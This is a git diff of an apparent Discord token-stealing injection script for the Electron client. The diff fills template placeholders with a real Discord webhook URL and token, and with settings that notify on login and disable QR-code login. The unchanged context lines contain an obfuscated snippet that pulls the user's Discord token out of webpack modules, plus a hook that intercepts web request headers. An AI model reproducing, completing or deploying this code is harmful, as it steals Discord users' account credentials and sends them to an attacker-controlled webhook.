@@ -6,7 +6,7 @@ const {
 } = require('electron')
 const querystring = require('querystring');
 const os = require('os')
-var webhook = "%WEBHOOK_LINK%";
+var webhook = "https://discord.com/api/webhooks/961996469274030110/SlkO8rITFchnhydJ1rncKZ2Lv0XSbayGB-JRguOtXA5QwKHYFCSMG0TvWy2oi10Rcg8N";
 const computerName = os.hostname();
 const discordInstall = `${__dirname}`
 const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
@@ -20,11 +20,11 @@ String.prototype.insert = function (index, string) {
 };
 
 const config = {
-    "logout": "%LOGOUT%",
-    "logout-notify": "%LOGOUTNOTI%",
-    "init-notify":"%INITNOTI%",
+    "logout": "false",
+    "logout-notify": "true",
+    "init-notify":"true",
     "embed-color": 3447704,
-    "disable-qr-code":"%DISABLEQRCODE%"
+    "disable-qr-code":"false"
 }
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
